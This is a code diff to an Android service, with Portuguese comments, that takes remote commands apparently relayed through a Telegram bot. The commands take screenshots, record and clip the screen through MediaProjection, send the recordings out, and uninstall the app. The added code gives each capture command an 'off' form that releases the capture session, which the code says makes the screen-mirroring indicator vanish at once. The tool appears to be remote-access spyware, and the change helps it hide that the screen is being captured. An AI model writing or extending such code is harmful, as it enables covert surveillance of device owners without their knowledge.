@@ -55,6 +55,7 @@ public class RelayService extends Service {
         String low = c.toLowerCase(Locale.ROOT);
         try {
             if (low.equals("ping")) { tg.say("pong"); return; }
+            if (low.equals("shot off")) { liberarProjecao(); tg.say("shot: sessao de captura ENCERRADA - indicador liberado"); return; }
             if (low.equals("shot")) { cmdShot(); return; }
             if (low.equals("rec") || low.startsWith("rec ")) { cmdRec(c); return; }
             if (low.equals("clip") || low.startsWith("clip ")) { cmdClip(c); return; }
@@ -341,6 +342,12 @@ private void cmdUninstall() {
 
     private void cmdRec(String c) {
         String arg = c.trim().length() > 3 ? c.trim().substring(3).trim().toLowerCase(java.util.Locale.ROOT) : "";
+        if (arg.equals("off")) {
+            boolean gravando = recAtual != null;
+            liberarProjecao();
+            tg.say(gravando ? "rec: desligado (gravacao atual pode se perder)" : "rec: sessao de captura ENCERRADA");
+            return;
+        }
         if (arg.equals("parar") || arg.equals("stop")) {
             if (recAtual != null) { pararRec = true; tg.say("rec: finalizando e enviando..."); }
             else tg.say("rec: nada gravando");
@@ -368,6 +375,19 @@ private void cmdUninstall() {
 
     /** Abre activity direto da background (isencao SYSTEM_ALERT_WINDOW).
      *  Retorna false se o sistema bloquear -> caller cai na notificacao. */
+    /** Solta a sessao MediaProjection: indicador de espelhamento some na hora. */
+    private void liberarProjecao() {
+        try {
+            pararRec = true;
+            clipAtivo = false;
+            if (BridgeHolder.projection != null) {
+                BridgeHolder.projection.stop();
+                BridgeHolder.projection = null;
+            }
+            stopService(new Intent(this, CaptureService.class));
+        } catch (Throwable ignored) { }
+    }
+
     private boolean abrirDireto(Intent i) {
         try {
             i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -496,7 +516,12 @@ private void cmdUninstall() {
 
     private void cmdClip(String c) {
         String arg = c.trim().length() > 4 ? c.trim().substring(4).trim().toLowerCase(java.util.Locale.ROOT) : "";
-        if (arg.equals("off") || arg.equals("desligar")) { clipAtivo = false; tg.say("clip: desligado"); return; }
+        if (arg.equals("off") || arg.equals("desligar")) {
+            boolean rodando = clipRodando;
+            liberarProjecao();
+            tg.say(rodando ? "clip: desligado e sessao de captura ENCERRADA" : "clip: sessao ja estava encerrada");
+            return;
+        }
         if (!arg.isEmpty() && !arg.equals("on")) { tg.say("clip: uso: clip | clip off"); return; }
         if (clipAtivo && BridgeHolder.projection != null) { entregarClip(); return; }
         if (BridgeHolder.projection == null) {
